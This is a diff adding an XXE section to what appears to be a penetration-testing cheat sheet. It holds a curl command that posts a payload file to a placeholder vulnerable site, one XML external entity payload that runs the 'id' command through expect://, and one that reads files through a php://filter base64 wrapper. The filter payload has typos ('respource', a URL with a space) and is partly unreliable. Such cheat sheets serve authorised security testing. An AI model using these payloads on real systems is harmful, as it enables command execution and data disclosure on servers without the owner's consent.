@@ -328,6 +328,46 @@ But after replacing character with ? you may receive a successful response (200)
 
 {% endtab %}
 
+{% tab title="XXE" %}
+Send Post request with path to xml file for exploitation
+
+```
+curl -d@/home/researcher/Desktop/payloads/poc.xml http://vulnerablesite.com/home/vulnerable.php
+```
+
+ID.xml
+
+```
+<!--ID command example-->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "expect://id" >]>
+
+<entry>
+    <subject>&xxe;</subject>
+    <category>Clothing</category>
+    <text>New Shoes</text>
+</entry>
+```
+
+Read Robots.txt (Base 64)
+
+```
+<!--Base64 response example-->
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "php://filter/read=convert.base64-encode/respource=http://vulnerable site/" >]>
+
+<entry>
+    <subject>&xxe;</subject>
+    <category>Clothing</category>
+    <text>New Shoes</text>
+</entry>
+```
+{% endtab %}
+
 {% tab title="Additonal Payloads" %}
 #### Test for XSS and SQLi
 
